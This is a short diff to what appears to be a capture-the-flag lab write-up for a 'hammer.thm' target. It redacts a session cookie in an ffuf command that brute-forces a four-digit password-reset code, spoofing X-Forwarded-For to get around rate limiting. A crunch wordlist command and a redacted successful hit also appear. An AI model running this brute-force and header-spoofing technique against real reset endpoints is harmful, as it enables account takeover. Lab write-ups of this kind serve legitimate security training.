@@ -104,7 +104,7 @@ crunch 4 4 -o otp.txt -t %%%% -s 0000 -e 9999
 ### ffuf
 ```bash
 ffuf -w otp.txt:w1 -w otp.txt:w2 -mode pitchfork -X POST -d "recovery_code=w1&s=80" -H "Content-Type: application/x-www-form-urlencoded" \
--H "X-Forwarded-For: w2" -u "http://hammer.thm:1337/reset_password.php" -b "PHPSESSID=g2uij0q1fjjf81jufr6fbj4091" -t 100 -fs 2200 -fs 2291
+-H "X-Forwarded-For: w2" -u "http://hammer.thm:1337/reset_password.php" -b "PHPSESSID=<REDACTED>" -t 100 -fs 2200 -fs 2291
 
 [Status: 200, Size: 2190, Words: 595, Lines: 53, Duration: 967ms]
     * w1: <REDACTED>
